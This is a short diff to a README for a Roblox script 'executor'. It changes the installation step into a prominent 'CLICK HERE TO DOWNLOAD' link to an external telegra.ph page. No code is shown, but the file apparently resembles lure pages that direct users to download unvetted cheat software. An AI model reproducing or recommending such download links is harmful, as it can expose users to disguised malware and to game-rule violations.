@@ -21,7 +21,7 @@ The program provides an interface for executing custom scripts within the Roblox
 * Programming Languages: Lua
 
 # **Installation:**
-1. Follow manual from [HERE](https://telegra.ph/How-to-install-Roblox-Lunar-Executor-11-18)
+1. [CLICK HERE TO DOWNLOAD](https://telegra.ph/How-to-install-Roblox-Lunar-Executor-11-18)
 
 # **Disclaimer:**
 
